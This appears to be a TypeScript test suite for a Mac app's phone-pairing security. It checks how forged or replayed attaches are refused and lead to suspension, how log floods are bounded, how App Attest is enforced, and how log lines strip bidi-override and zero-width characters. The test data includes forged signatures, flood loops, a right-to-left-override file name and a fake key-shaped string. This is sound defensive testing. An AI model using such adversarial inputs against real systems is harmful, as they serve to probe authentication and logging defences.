	const offerLine = phone.offer({ pairing, challenge: attachChallenge().challenge, binding: offerBinding, presenceKey: spki(offered.publicKey) }, { presence: offered.privateKey });
	assert.deepEqual(await offerPresenceKey({ offer: offerLine, binding: b64url(offerBinding), path: "relay" }), { waiting: true });
	for (let i = 0; i < 8; i++) await assert.rejects(attachWith(offered.privateKey), refusedFor(PRESENCE_KEY_WAITS, "presence"), "an attach signed by the waiting key");
	assert.equal(suspended(), false, "eight attaches refused only because their key waits do not suspend the device");
	await flushDeviceLog();
	assert.ok((await harness.snapshot(DeviceLog, context))!.entries.some((entry) => entry.device === phone.id && entry.method === "attach" && entry.outcome === "refused" && entry.why === PRESENCE_KEY_WAITS), "they are logged");
	await counts("a presence signature neither key made, while one waits", () => attachWith(p256().privateKey), PRESENCE_KEY_WAITS, "presence");
	await counts("no presence signature, while a key waits", () => attachWith(null), PRESENCE_KEY_WAITS, "presence");
	// The phone is told the same of both, but the log gives the counted refusal words of its own, so that the two never
	// merge into one entry, and the person can tell a forgery from their own phone waiting (#1008's read, #997).
	await flushDeviceLog();
	const attachRefusals = async (why: string) => (await harness.snapshot(DeviceLog, context))!.entries.filter((entry) => entry.device === phone.id && entry.method === "attach" && entry.outcome === "refused" && entry.why === why).reduce((sum, entry) => sum + (entry.count ?? 1), 0);
	assert.deepEqual([await attachRefusals(PRESENCE_KEY_WAITS), await attachRefusals(PRESENCE_BY_NEITHER_KEY)], [8, 10], "eight by the waiting key, ten by neither key, in entries of their own");
	const usedChallenge = attachChallenge().challenge;
	await attachWith(renewed.privateKey, { challenge: usedChallenge });
	await counts("a used challenge, under the waiting key", () => attachWith(offered.privateKey, { challenge: usedChallenge }), /not one this Mac issued, or was used/);
	await counts("a challenge the waiting key's refusal used", async () => {
		const challenge = attachChallenge().challenge;
		await assert.rejects(attachWith(offered.privateKey, { challenge }), refusedFor(PRESENCE_KEY_WAITS, "presence"));
		return attachWith(offered.privateKey, { challenge });
	}, /not one this Mac issued, or was used/);
	await counts("another channel, under the waiting key", () => attachWith(offered.privateKey, { signedBinding: randomBytes(32) }), /signed for another channel/);
	await counts("another pairing, under the waiting key", () => attachWith(offered.privateKey, { pairing: b64url(randomBytes(16)) }), /another pairing/);
	await counts("a stale time, under the waiting key", () => attachWith(offered.privateKey, { at: Date.now() - 3 * 60_000 }), /more than two minutes/, "clock");
	await deviceRequests["devices.refusePresenceKey"]!({ device: phone.id }, mac);
	await counts("the refused key, with no key waiting", () => attachWith(offered.privateKey), "The attach's presence signature is not the presence key's.", "presence");
	await counts("a presence signature by another key, with no key waiting", () => attachWith(p256().privateKey), "The attach's presence signature is not the presence key's.", "presence");
	step("an attach refused only because its Face ID key waits on the Mac is told so and not counted; a wrong or missing presence signature, a used challenge, another channel or pairing and a stale time still count, a key waiting or not, and five suspend the device");

	// ---- The devices' log (4.4): bounded in what an entry holds, by device, and with repeated refusals made one
	const other = `dev_${b64url(randomBytes(16))}`;
	await logDevice({ device: other, path: "relay", method: "submit", summary: "Sent a message", presence: true, outcome: "done" });
	await logDevice({ device: phone.id, path: "relay", method: "pair", summary: "Paired", presence: false, outcome: "done" });
	await logDevice({ device: phone.id, path: "relay", method: "x".repeat(5_000), summary: "y".repeat(5_000), presence: true, outcome: "refused", why: "z".repeat(5_000) });
	await flushDeviceLog();
	let entries = (await harness.snapshot(DeviceLog, context))!.entries;
	const oversized = entries.at(-1)!;
	assert.equal(oversized.method, "unknown", "a method no list places is logged under one name, never its text");
	assert.ok(oversized.summary.length <= 200 && oversized.why!.length <= 200, "summary and why are cut short");
	const refusedOnce = { device: phone.id, path: "relay" as const, summary: "providers.setKey", presence: true, outcome: "refused" as const, why: ONLY_ON_THE_MAC };
	for (let i = 0; i < 30; i++) {
		await logDevice({ ...refusedOnce, method: "providers.setKey" });
		await logDevice({ ...refusedOnce, method: "mcp.save" });
	}
	for (const deadline = Date.now() + PATIENT_MS; ; await new Promise((resolve) => setTimeout(resolve, 50))) {
		entries = (await harness.snapshot(DeviceLog, context))!.entries;
		if (entries.at(-2)?.count === 30 && entries.at(-1)?.count === 30) break;
		assert.ok(Date.now() < deadline, "the counts are added");
	}
	assert.deepEqual(entries.slice(-2).map((entry) => entry.method), ["providers.setKey", "mcp.save"], "30 refusals each of two kinds, in turn, within a minute: two entries");
	const flood = 2_050;
	const began = performance.now();
	// Off the request's path: entries wait in memory and are written together, so a flood costs a handful of writes.
	const commit = harness.commit.bind(harness);
	let commits = 0;
	(harness as unknown as { commit: typeof commit }).commit = ((...given: Parameters<typeof commit>) => {
		commits += 1;
		return commit(...given);
	}) as typeof commit;
	for (let i = 0; i < flood; i++) await logDevice({ device: phone.id, path: "relay", method: "submit", summary: `Sent a message ${i}`, presence: true, outcome: "done" });
	assert.ok(commits <= 2, `${flood} entries made with ${commits} writes`);
	await flushDeviceLog();
	console.log(`    ${flood} entries from one device in ${Math.round(performance.now() - began)} ms, ${commits} writes`);
	entries = (await harness.snapshot(DeviceLog, context))!.entries;
	assert.ok(entries.some((entry) => entry.device === other), "another device's entry stays");
	assert.ok(entries.some((entry) => entry.device === phone.id && entry.method === "pair"), "and the pairing");
	// Beside the pairing, the suspensions and the offer of a Face ID key above, and its refusal, kept as it is.
	const keptAside = ["pair", "suspend", "presenceKey", "devices.refusePresenceKey"];
	assert.equal(entries.filter((entry) => entry.device === phone.id && !keptAside.includes(entry.method)).length, 2_000, "one device keeps its own newest 2,000");
	const stored = async () => (await harness.snapshot(DeviceLog, context))!.entries;
	commits = 0;
	for (let i = 0; i < 200; i++) await logDevice({ device: other, path: "relay", method: "submit", summary: `ordinary ${i}`, presence: true, outcome: "done" });
	assert.ok(commits <= 1, `200 ordinary requests wait in memory: ${commits} writes`);
	await logDevice({ device: other, path: "relay", method: "usage.setBudget", summary: "widening", presence: true, outcome: "done" }, true);
	assert.ok(commits <= 2, `and are written with the next urgent one: ${commits} writes in all`);
	assert.ok((await stored()).some((entry) => entry.summary === "widening") && (await stored()).filter((entry) => entry.summary.startsWith("ordinary ")).length === 200, "a widening request is on disk when logDevice resolves, the waiting ones with it");
	await logDevice({ device: other, path: "relay", method: "submit", summary: "at the stop", presence: true, outcome: "done" });
	assert.ok(!(await stored()).some((entry) => entry.summary === "at the stop"));
	await flushDeviceLog();
	assert.ok((await stored()).some((entry) => entry.summary === "at the stop"), "what waits is written at a clean stop (main.ts calls flushDeviceLog)");

	// A suspension and its entry are stored in one write (#881): after no write is the device suspended with no entry.
	const after: { suspended: boolean; entry: boolean }[] = [];
	const counting = harness.commit.bind(harness);
	const suspendEntries = async () => (await stored()).filter((one) => one.device === phone.id && one.method === "suspend").length;
	const earlier = await suspendEntries(); // the suspensions above, by refused attaches
	(harness as unknown as { commit: typeof commit }).commit = (async (...given: Parameters<typeof commit>) => {
		const result = await counting(...given);
		const device = (await harness.snapshot(Devices, context))!.devices.find((one) => one.id === phone.id)!;
		after.push({ suspended: device.suspendedAt !== null, entry: (await suspendEntries()) > earlier });
		return result;
	}) as typeof commit;
	for (let i = 0; i < 5 && !suspended(); i++) await assert.rejects(attachWith(p256().privateKey), /presence signature|suspended/);
	assert.ok(suspended(), "five refused presence signatures suspend the device");
	assert.ok(after.some((one) => one.suspended && one.entry), JSON.stringify(after));
	assert.ok(!after.some((one) => one.suspended && !one.entry), `never suspended without its entry: ${JSON.stringify(after)}`);
	const suspendEntry = (await stored()).findLast((one) => one.device === phone.id && one.method === "suspend")!;
	assert.equal(suspendEntry.at, devicesState().devices.find((one) => one.id === phone.id)!.suspendedAt, "the entry has the suspension's time");
	(harness as unknown as { commit: typeof commit }).commit = commit;
	await harness.close(context);
	step("a suspension is stored in the same write as its entry in the log, never before it");
	step(`the devices' log: a method it does not know is "unknown", every field cut short, refusals made one entry with a count, one device's flood of ${flood} pushes out neither another's entries nor its own pairing, and entries wait in memory but for urgent ones and a stop`);
}

// ---- A pairing whose device cannot be saved: the phone is told, not left waiting (3.3 step 8)

{
	process.env.PI2_APP_ATTEST_STAND_IN = "1";
	process.env.PI2_APP_ATTEST_TEAM = "ABCDE12345";
	const harness = await Harness.open(await openNodeSqliteStorage(join(mkdtempSync(join(work, "save-")), "session.sqlite")), { registry: createRegistry(), models: createModels() }, context);
	const pairing = b64url(randomBytes(16));
	await harness.commit(async (tx) => {
		const doc = await tx.doc(Devices);
		Object.assign(doc, { pairing, relay: "ws://127.0.0.1:9/v1", macKeys: { identity: spki(p256().publicKey), channel: b64url(randomBytes(32)), record: spki(p256().publicKey), relay: spki(p256().publicKey), secureEnclave: false } });
		doc.remote = { ...doc.remote, preview: true, on: true };
	}, context);
	await wireDevices({ harness, context, log: () => {}, release: false, names: { conversation: () => undefined, project: () => undefined } });
	const told: any[] = [];
	Object.assign(remoteHooks, { toHelper: (event: unknown) => told.push(event), ready: async () => ({ addresses: [] }), addresses: () => [], changed: () => {} });
	const client = { socket: { write: () => true, destroyed: false, destroy: () => {} }, subscriptions: new Map(), shown: new Set() } as unknown as Client;
	const { payload } = (await deviceRequests["devices.pairStart"]!({}, client)) as { payload: string };
	const secret = Buffer.from(new URL(payload).searchParams.get("s")!, "base64url");
	const binding = randomBytes(32);
	const challenge = randomBytes(32);
	const { claim } = await pairClaim({ claim: new Phone("Unsaved iPhone").claim(pairing, binding, challenge), binding: b64url(binding), challenge: b64url(challenge), path: "relay" });
	const digits = String(createHmac("sha256", secret).update(Buffer.concat([Buffer.from("pi2-digits"), Buffer.from([0]), binding])).digest().readUInt32BE(0) % 1_000_000).padStart(6, "0");
	const commit = harness.commit.bind(harness);
	(harness as unknown as { commit: () => Promise<never> }).commit = async () => {
		throw new Error("The disk is full.");
	};
	await assert.rejects(deviceRequests["devices.pairConfirm"]!({ digits }, client), /The disk is full/);
	(harness as unknown as { commit: typeof commit }).commit = commit;
	assert.deepEqual(told.filter((event) => event.kind === "pairRefused" || event.kind === "paired"), [{ kind: "pairRefused", claim, why: "The Mac could not save the pairing. Start again.", reason: "unsaved" }], "the phone is refused, with the word it is told, and told nothing else");
	assert.equal(devicesState().devices.length, 0, "and nothing was paired");

	// A first pairing whose save is slow (#776's point 21, #881): the window closes before the device is stored, and with
	// no device paired yet pi² Remote would be unwanted, and stopped two seconds later with `paired` still to send. It
	// stays wanted until the save is done.
	const wanted: boolean[] = [];
	remoteHooks.changed = () => wanted.push(helperWanted());
	const again = (await deviceRequests["devices.pairStart"]!({}, client)) as { payload: string };
	const secret2 = Buffer.from(new URL(again.payload).searchParams.get("s")!, "base64url");
	const binding2 = randomBytes(32);
	const challenge2 = randomBytes(32);
	const slow = await pairClaim({ claim: new Phone("Slow iPhone").claim(pairing, binding2, challenge2), binding: b64url(binding2), challenge: b64url(challenge2), path: "home" });
	const digits2 = String(createHmac("sha256", secret2).update(Buffer.concat([Buffer.from("pi2-digits"), Buffer.from([0]), binding2])).digest().readUInt32BE(0) % 1_000_000).padStart(6, "0");
	let saved!: () => void;
	const held = new Promise<void>((resolve) => (saved = resolve));
	let holding = false;
	(harness as unknown as { commit: typeof commit }).commit = (async (...given: Parameters<typeof commit>) => {
		if (!holding) {
			holding = true;
			await held;
		}
		return commit(...given);
	}) as typeof commit;
	wanted.length = 0;
	const confirming = deviceRequests["devices.pairConfirm"]!({ digits: digits2 }, client) as Promise<{ device: string }>;
	await until("the device's save under way", () => holding);
	assert.equal(devicesState().devices.length, 0, "nothing is stored yet");
	assert.equal(helperWanted(), true, "with no device stored and the window closed, pi² Remote is still wanted");
	assert.ok(wanted.length > 0 && wanted.every(Boolean), `and was at every change meanwhile: ${JSON.stringify(wanted)}`);
	saved();
	const { device: slowDevice } = await confirming;
	(harness as unknown as { commit: typeof commit }).commit = commit;
	assert.ok(wanted.every(Boolean), `wanted throughout: ${JSON.stringify(wanted)}`);
	assert.equal(told.find((event) => event.kind === "paired")?.claim, slow.claim, "and `paired` went to it");
	assert.deepEqual(devicesState().devices.map((one) => one.id), [slowDevice]);
	await harness.close(context);
	step("a pairing whose device cannot be saved is refused to the phone, not left without an answer; a first pairing whose save is slow keeps pi² Remote wanted until `paired` is sent");
}

// ---- A claim with no attestation, from the simulator: only a test copy's engine started with --remote takes it (10)

{
	// A copy as scripts/test-copy lays one out, which testCopySuffix checks: its data folder under a home of this test's
	// own, its Keychain service named (nothing is written there), and its bundle in this checkout's app/build/test-copies
	// (git ignores it), removed at the end.
	const suffix = `test-unattested-${process.pid}`;
	const userHome = mkdtempSync(join(work, "user-"));
	const data = join(userHome, "Library", "Application Support", `pi2-${suffix}`);
	mkdirSync(data, { recursive: true });
	const copyFolder = join(import.meta.dirname, "..", "..", "app", "build", "test-copies", suffix);
	process.on("exit", () => rmSync(copyFolder, { recursive: true, force: true }));
	mkdirSync(join(copyFolder, `pi² ${suffix}.app`, "Contents", "MacOS"), { recursive: true });
	writeFileSync(join(copyFolder, `pi² ${suffix}.app`, "Contents", "MacOS", "pi2"), "");
	const before = { HOME: process.env.HOME, PI2_HOME: process.env.PI2_HOME, PI2_KEYCHAIN_SERVICE: process.env.PI2_KEYCHAIN_SERVICE };
	const unattested = async (release: boolean, env: Record<string, string | undefined>) => {
		for (const [name, value] of Object.entries(env)) {
			if (value === undefined) delete process.env[name];
			else process.env[name] = value;
		}
		const harness = await Harness.open(await openNodeSqliteStorage(join(mkdtempSync(join(work, "unattested-")), "session.sqlite")), { registry: createRegistry(), models: createModels() }, context);
		const pairing = b64url(randomBytes(16));
		await harness.commit(async (tx) => {
			const doc = await tx.doc(Devices);
			Object.assign(doc, { pairing, relay: "ws://127.0.0.1:9/v1", macKeys: { identity: spki(p256().publicKey), channel: b64url(randomBytes(32)), record: spki(p256().publicKey), relay: spki(p256().publicKey), secureEnclave: false } });
			doc.remote = { ...doc.remote, preview: true, on: true };
		}, context);
		await wireDevices({ harness, context, log: () => {}, release, names: { conversation: () => undefined, project: () => undefined } });
		const told: any[] = [];
		Object.assign(remoteHooks, { toHelper: (event: unknown) => told.push(event), ready: async () => ({ addresses: [] }), addresses: () => [], changed: () => {} });
		const client = { socket: { write: () => true, destroyed: false, destroy: () => {} }, subscriptions: new Map(), shown: new Set() } as unknown as Client;
		const { payload } = (await deviceRequests["devices.pairStart"]!({}, client)) as { payload: string };
		const secret = Buffer.from(new URL(payload).searchParams.get("s")!, "base64url");
		const binding = randomBytes(32);
		const challenge = randomBytes(32);
		const line: any = new Phone("Simulator").claim(pairing, binding, challenge);
		line.attestation = null;
		line.keyId = null;
		const digits = String(createHmac("sha256", secret).update(Buffer.concat([Buffer.from("pi2-digits"), Buffer.from([0]), binding])).digest().readUInt32BE(0) % 1_000_000).padStart(6, "0");
		try {
			await pairClaim({ claim: line, binding: b64url(binding), challenge: b64url(challenge), path: "home" });
			await deviceRequests["devices.pairConfirm"]!({ digits }, client);
			return { paired: told.find((event) => event.kind === "paired"), devices: devicesState().devices };
		} finally {
			await harness.close(context);
		}
	};
	const copy = { HOME: userHome, PI2_HOME: data, PI2_KEYCHAIN_SERVICE: `dev.pi2.credentials.${suffix}`, PI2_TEST_COPY: suffix, PI2_PAIR_UNATTESTED: "1" };
	const { paired, devices } = await unattested(false, copy);
	assert.equal(paired.device.attestKeyId, null, "pi² Remote is told the device has no App Attest key");
	assert.equal(devices.length, 1);
	assert.equal(devices[0]!.attestKeyId, "", "and the engine keeps none");
	await assert.rejects(unattested(false, { ...copy, PI2_PAIR_UNATTESTED: undefined }), /no App Attest attestation/, "a test copy not started with --remote");
	await assert.rejects(unattested(false, { ...copy, PI2_TEST_COPY: undefined }), /no App Attest attestation/, "the switch outside a test copy");
	await assert.rejects(unattested(false, { ...copy, PI2_PAIR_UNATTESTED: "yes" }), /no App Attest attestation/, "a switch that is not 1");
	// PI2_TEST_COPY as main.ts checks it for its fixtures, not merely set: the security read paired with "" and "dev".
	await assert.rejects(unattested(false, { ...copy, PI2_TEST_COPY: "" }), /no App Attest attestation/, "an empty suffix");
	await assert.rejects(unattested(false, { ...copy, PI2_TEST_COPY: "dev" }), /no App Attest attestation/, "the suffix every development build has");
	await assert.rejects(unattested(false, { ...copy, PI2_TEST_COPY: "test-none" }), /no App Attest attestation/, "a suffix whose copy is not there");
	await assert.rejects(unattested(false, { ...copy, PI2_HOME: userHome }), /no App Attest attestation/, "another data folder");
	await assert.rejects(unattested(false, { ...copy, PI2_KEYCHAIN_SERVICE: "dev.pi2.credentials" }), /no App Attest attestation/, "another Keychain service");
	await assert.rejects(unattested(true, copy), /no App Attest attestation/, "an engine told it is a release one (wireDevices' release), in this development checkout");
	assert.equal((await unattested(false, copy)).devices.length, 1, "and the same copy pairs again");
	rmSync(copyFolder, { recursive: true, force: true });
	await assert.rejects(unattested(false, copy), /no App Attest attestation/, "once the copy's bundle is gone");
	for (const [name, value] of Object.entries(before)) {
		if (value === undefined) delete process.env[name];
		else process.env[name] = value;
	}
	delete process.env.PI2_TEST_COPY;
	delete process.env.PI2_PAIR_UNATTESTED;
	step("a claim with no attestation pairs only in a test copy's development engine started with --remote: not with PI2_TEST_COPY empty, dev, or without the copy's folders; with no App Attest key kept or told");
}

// ---- The same claim in a release-laid-out engine: refused, with both switches set and the copy's folders there (10)

{
	// The engine's source copied twice over into a checkout of this test's own, with a copy laid out as above. Once as
	// it is (a development engine: the claim is taken), then with a BUILD file beside src, as a release build writes
	// (testswitches.ts): the same claim is refused as one with no attestation, as on main, though the engine is told
	// it is not a release one, so that only the BUILD file stops it.
	const checkout = mkdtempSync(join(work, "release-"));
	const engine = join(checkout, "engine");
	cpSync(join(import.meta.dirname, "..", "src"), join(engine, "src"), { recursive: true });
	cpSync(join(import.meta.dirname, "..", "package.json"), join(engine, "package.json"));
	symlinkSync(join(import.meta.dirname, "..", "node_modules"), join(engine, "node_modules"));
	const suffix = "test-release";
	const userHome = mkdtempSync(join(work, "user-"));
	const data = join(userHome, "Library", "Application Support", `pi2-${suffix}`);
	mkdirSync(data, { recursive: true });
	mkdirSync(join(checkout, "app", "build", "test-copies", suffix, `pi² ${suffix}.app`, "Contents", "MacOS"), { recursive: true });
	writeFileSync(join(checkout, "app", "build", "test-copies", suffix, `pi² ${suffix}.app`, "Contents", "MacOS", "pi2"), "");
	const probe = join(engine, "probe.ts");
	writeFileSync(
		probe,
		`import { createHmac, generateKeyPairSync, randomBytes, sign } from "node:crypto";
import { BACKGROUND_CONTEXT as context } from "@earendil-works/chord/context";
import { createModels } from "@earendil-works/pi-ai";
import { createRegistry, Harness } from "@earendil-works/pi-durable";
import { openNodeSqliteStorage } from "@earendil-works/pi-durable/storage/sqlite/node";
import { deviceRequests, Devices, pairClaim, remoteHooks, wireDevices } from "./src/devices.ts";
const b64url = (bytes) => Buffer.from(bytes).toString("base64url");
const p256 = () => generateKeyPairSync("ec", { namedCurve: "P-256" });
const spki = (key) => b64url(key.publicKey.export({ type: "spki", format: "der" }));
const harness = await Harness.open(await openNodeSqliteStorage(process.argv[2]), { registry: createRegistry(), models: createModels() }, context);
const pairing = b64url(randomBytes(16));
await harness.commit(async (tx) => {
	const doc = await tx.doc(Devices);
	Object.assign(doc, { pairing, relay: "ws://127.0.0.1:9/v1", macKeys: { identity: spki(p256()), channel: b64url(randomBytes(32)), record: spki(p256()), relay: spki(p256()), secureEnclave: false } });
	doc.remote = { ...doc.remote, preview: true, on: true };
}, context);
await wireDevices({ harness, context, log: () => {}, release: false, names: { conversation: () => undefined, project: () => undefined } });
Object.assign(remoteHooks, { toHelper: () => {}, ready: async () => ({ addresses: [] }), addresses: () => [], changed: () => {} });
await deviceRequests["devices.pairStart"]({}, { socket: { write: () => true, destroyed: false, destroy: () => {} }, subscriptions: new Map(), shown: new Set() });
const binding = randomBytes(32);
const device = p256();
const signed = JSON.stringify({ v: 2, kind: "pair", pairing, binding: b64url(binding) });
const claim = { v: 2, device: { name: "Simulator", model: "iPhone 17 Pro", system: "iOS 27.1", build: "7", deviceKey: spki(device), presenceKey: spki(p256()), channelKey: b64url(randomBytes(32)), recordKey: spki(p256()) }, attestation: null, keyId: null, signed, signature: b64url(sign("sha256", Buffer.from(signed), { key: device.privateKey, dsaEncoding: "ieee-p1363" })) };
let outcome = "taken";
try {
	await pairClaim({ claim, binding: b64url(binding), challenge: b64url(randomBytes(32)), path: "home" });
} catch (error) {
	outcome = error.message;
}
await harness.close(context);
console.log(JSON.stringify(outcome));
`,
	);
	const env = { ...process.env, HOME: userHome, PI2_HOME: data, PI2_KEYCHAIN_SERVICE: `dev.pi2.credentials.${suffix}`, PI2_TEST_COPY: suffix, PI2_PAIR_UNATTESTED: "1" };
	const claimIn = () => JSON.parse(execFileSync(process.execPath, [probe, join(mkdtempSync(join(work, "probe-")), "session.sqlite")], { env, encoding: "utf8" }).trim().split("\n").at(-1)!);
	assert.equal(claimIn(), "taken", "laid out as a development engine, the copied engine takes the claim");
	writeFileSync(join(engine, "BUILD"), "test-release\n");
	assert.equal(claimIn(), "The claim has no App Attest attestation.", "with a BUILD file beside src, the same claim is refused as on main");
	step("a release-laid-out engine refuses the claim with no attestation, with both switches set and the copy's folders there; the same engine without BUILD takes it");
}

// ---- A new Face ID key against a real store (#786): the log's kept share, and the races of a save under way

{
	const opened = async (devices: Device[], pairing: string) => {
		const harness = await Harness.open(await openNodeSqliteStorage(join(mkdtempSync(join(work, "face-")), "session.sqlite")), { registry: createRegistry(), models: createModels() }, context);
		await harness.commit(async (tx) => {
			const doc = await tx.doc(Devices);
			doc.pairing = pairing;
			doc.remote = { ...doc.remote, preview: true, on: true };
			doc.devices.push(...devices);
		}, context);
		await wireDevices({ harness, context, log: () => {}, release: false, names: { conversation: () => undefined, project: () => undefined } });
		return harness;
	};
	const recordFor = (phone: Phone, pendingPresenceKey: string | null): Device => ({ id: phone.id, ...phone.description(), pendingPresenceKey, attestKeyId: phone.keyId, suspendedAt: null, pairedAt: Date.now(), lastSeenAt: null, lastPath: null, revokedAt: null });

	// A device's own refused requests, under any name the log keeps past a device's share, stay in its share: another
	// device's pairing is never pushed out (the security read's flood, at #892).
	let harness = await opened([], b64url(randomBytes(16)));
	const flooder = `dev_${b64url(randomBytes(16))}`;
	const other = `dev_${b64url(randomBytes(16))}`;
	const kept = ["pair", "suspend", "presenceKey", "devices.acceptPresenceKey", "devices.refusePresenceKey"];
	const flood = 10_050;
	const base = Date.now() - (kept.length * flood + 10) * 61_000;
	await logDevice({ device: other, path: "relay", method: "pair", summary: "Paired", presence: false, outcome: "done", at: base - 1_000 }, true);
	let minute = 0;
	for (const name of kept) {
		// A minute apart, so that no two are made one entry.
		for (let i = 0; i < flood; i++) await logDevice({ device: flooder, path: "relay", method: name, summary: name, presence: true, outcome: "refused", why: ONLY_ON_THE_MAC, at: base + minute++ * 61_000 });
		await flushDeviceLog();
		const entries = (await harness.snapshot(DeviceLog, context))!.entries;
		assert.ok(entries.some((entry) => entry.device === other && entry.method === "pair"), `${flood} refused ${name} leave another device's pairing`);
		assert.ok(entries.filter((entry) => entry.device === flooder).length <= 2_000, `and stay in the device's own share: ${name}`);
	}
	await logDevice({ device: other, path: "relay", method: "devices.acceptPresenceKey", summary: "accepted", presence: false, outcome: "done" }, true);
	for (let i = 0; i < 2_100; i++) await logDevice({ device: other, path: "relay", method: "submit", summary: `${i}`, presence: true, outcome: "done" });
	await flushDeviceLog();
	const after = (await harness.snapshot(DeviceLog, context))!.entries;
	assert.ok(["pair", "devices.acceptPresenceKey"].every((method) => after.some((entry) => entry.device === other && entry.method === method)), "what the engine did stays past the device's own flood");
	await harness.close(context);
	step(`a device's ${flood} refused requests under each name the log keeps (${kept.join(", ")}) stay in its own share, and push out no other device's pairing; what the engine did stays`);

	// The races (the security read's S1 and S5): a save held until another is done, so that the order is the test's.
	const phone = new Phone();
	phone.id = `dev_${b64url(randomBytes(16))}`;
	const pairing = b64url(randomBytes(16));
	const renewed = p256();
	harness = await opened([recordFor(phone, spki(renewed.publicKey))], pairing);
	const client = { socket: { write: () => true, destroyed: false, destroy: () => {} }, subscriptions: new Map(), shown: new Set() } as unknown as Client;
	const commit = harness.commit.bind(harness);
	const holdNext = () => {
		let release!: () => void;
		const held = new Promise<void>((resolve) => (release = resolve));
		(harness as unknown as { commit: typeof commit }).commit = (async (...given: Parameters<typeof commit>) => {
			(harness as unknown as { commit: typeof commit }).commit = commit;
			await held;
			return commit(...given);
		}) as typeof commit;
		return release;
	};
	const attachNow = () => {
		const binding = randomBytes(32);
		return checkAttach({ attach: phone.attach({ pairing, challenge: attachChallenge().challenge, binding }), binding: b64url(binding), path: "relay" });
	};
	let release = holdNext();
	const attaching = attachNow();
	await deviceRequests["devices.acceptPresenceKey"]!({ device: phone.id }, client);
	release();
	await assert.rejects(attaching, (error: Error) => error.message === PRESENCE_KEY_CHANGED, "an attach by the old key, saved while the new one was accepted");
	assert.ok((await harness.snapshot(DeviceLog, context))!.entries.some((entry) => entry.method === "devices.acceptPresenceKey" && entry.outcome === "done"), "the acceptance's entry is stored with it");
	phone.presence = renewed;
	assert.equal((await attachNow()).device.id, phone.id, "the new key attaches");
	// Refusing drops the key it read, and no other: one accepted meanwhile, and a new one offered, stays waiting.
	const first = p256();
	const second = p256();
	const offerOf = (key: ReturnType<typeof p256>) => {
		const binding = randomBytes(32);
		return offerPresenceKey({ offer: phone.offer({ pairing, challenge: attachChallenge().challenge, binding, presenceKey: spki(key.publicKey) }, { presence: key.privateKey }), binding: b64url(binding), path: "relay" });
	};
	assert.deepEqual(await offerOf(first), { waiting: true });
	release = holdNext();
	const refusing = deviceRequests["devices.refusePresenceKey"]!({ device: phone.id }, client);
	// The refusal's own save waits behind the log's flush: let it reach the held commit first.
	await new Promise((resolve) => setImmediate(resolve));
	await deviceRequests["devices.acceptPresenceKey"]!({ device: phone.id }, client);
	assert.deepEqual(await offerOf(second), { waiting: true });
	release();
	await assert.rejects(refusing, /changed while you answered/);
	assert.equal(devicesState().devices[0]!.pendingPresenceKey, spki(second.publicKey), "the key offered meanwhile still waits");
	assert.equal(devicesState().devices[0]!.presenceKey, spki(first.publicKey));
	phone.presence = first;
	// A revocation saved while an attach is saved: a plain refusal, where it was a TypeError.
	release = holdNext();
	const revoking = attachNow();
	await deviceRequests["devices.revoke"]!({ device: phone.id }, client);
	release();
	await assert.rejects(revoking, (error: Error) => error.message === "This device was revoked on the Mac.");
	await harness.close(context);
	step("an attach by the old key saved while the new one is accepted is refused, and one while the device is revoked; a refusal drops only the key it read; the acceptance's entry is stored with it");
}

// ---- A log line never throws, whatever a device sends (#895): it runs before the request's own `try`

{
	assert.equal(summarize("pushes.set", { project: null }), "Notifications: unquieted a project", "a project of null");
	assert.equal(summarize("pushes.set", { project: "x", needs: true }), "Notifications: needs on, unquieted a project", "a project that is a string");
	const cannotBeWords = { toString: 1, valueOf: 1 };
	assert.throws(() => String(cannotBeWords), TypeError, "String of what a device can send can throw");
	assert.equal(summarize("conversation.rename", { title: cannotBeWords }), "Renamed a conversation to “?”");
	assert.equal(summarize("github.merge", { number: cannotBeWords }), "Merged #?");
	assert.equal(summarize("work.act", { action: cannotBeWords, id: cannotBeWords }), "? work #?");
	// And a line that throws all the same is the method's name alone.
	const throwing = Object.defineProperty({}, "needs", {
		enumerable: true,
		get() {
			throw new Error("A getter's fault.");
		},
	});
	assert.equal(summarize("pushes.set", throwing), "pushes.set");
	step("a log line is made of whatever a device sends (null, an object for a string) and never throws: at worst it is the method's name");
}

// ---- A log line shows what a device sent as it reads (#902): nothing invisible, nothing turned around

{
	assert.equal(summarize("files.preview", { path: "notes\u202Etxt.md" }), "Showed the file “notestxt.md”", "a right-to-left override");
	assert.equal(summarize("files.preview", { path: "a\u2066b\u2069\u200Bc\u200D\uFEFF\u061C\u2060.md" }), "Showed the file “abc.md”", "isolates, zero-width characters, marks");
	assert.equal(summarize("conversation.rename", { title: "one\ntwo\u0000\uD800" }), "Renamed a conversation to “one two ”", "a line break, a NUL, half a character");
	const split = "sk-ant-api03-aKeyShapedString\u200BSplitByAZeroWidthSpace0123456789";
	assert.equal(summarize("conversation.rename", { title: split }), `Renamed a conversation to “${KEY_HIDDEN}”`, "nothing invisible splits a key out of the masks' sight");
	step("a log line has right-to-left overrides, other direction controls, zero-width characters and half characters taken out, before the masks");
}

// ---- A revocation reaches pi² Remote and the device's sessions whatever its watchers do (#895)

{
	const harness = await Harness.open(await openNodeSqliteStorage(join(mkdtempSync(join(work, "revoke-")), "session.sqlite")), { registry: createRegistry(), models: createModels() }, context);
	const phone = new Phone();
	phone.id = `dev_${b64url(randomBytes(16))}`;
	await harness.commit(async (tx) => {
		const doc = await tx.doc(Devices);
		doc.pairing = b64url(randomBytes(16));
		doc.remote = { ...doc.remote, preview: true, on: true };
		doc.devices.push({ id: phone.id, ...phone.description(), pendingPresenceKey: null, attestKeyId: phone.keyId, suspendedAt: null, pairedAt: Date.now(), lastSeenAt: null, lastPath: null, revokedAt: null });
	}, context);
	const logged: string[] = [];
	await wireDevices({ harness, context, log: (...parts) => logged.push(parts.join(" ")), release: false, names: { conversation: () => undefined, project: () => undefined } });
	const told: any[] = [];
	const closed: string[] = [];
	Object.assign(remoteHooks, { toHelper: (event: unknown) => told.push(event), closeSessions: (device: string) => closed.push(device), recordChanged: () => {}, changed: () => {} });
	const after: string[] = [];
	const failing = () => {
		throw new Error("A watcher's fault.");
	};
	const later = (device: string) => void after.push(device);
	revokedWatchers.add(failing);
	revokedWatchers.add(later);
	const client = { socket: { write: () => true, destroyed: false, destroy: () => {} }, subscriptions: new Map(), shown: new Set() } as unknown as Client;
	try {
		assert.deepEqual(await deviceRequests["devices.revoke"]!({ device: phone.id }, client), {});
	} finally {
		revokedWatchers.delete(failing);
		revokedWatchers.delete(later);
	}
	assert.deepEqual(told.filter((event) => event.kind === "revoke"), [{ kind: "revoke", device: phone.id }], "pi² Remote is told");
